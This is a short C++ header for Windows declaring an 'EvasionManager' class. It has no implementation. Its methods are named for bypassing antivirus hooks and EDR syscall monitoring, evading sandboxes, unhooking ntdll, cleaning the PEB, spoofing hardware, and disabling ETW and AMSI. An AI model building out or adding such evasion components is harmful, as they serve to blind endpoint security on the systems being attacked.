#pragma once
#include <Windows.h>
#include <string>

class EvasionManager {
public:
    EvasionManager();
    ~EvasionManager();

    bool Initialize();
    bool PerformChecks();

    // Evasion techniques
    bool BypassAVHooks();
    bool BypassEDRSyscalls();
    bool BypassSandboxChecks();
    bool CleanPEB();
    bool UnhookNtdll();
    bool SpoofHardware();
    bool DisableETW();
    bool DisableAMSI();

    bool IsEvasionActive() const { return m_evasionActive; }

private:
    bool m_evasionActive;
};
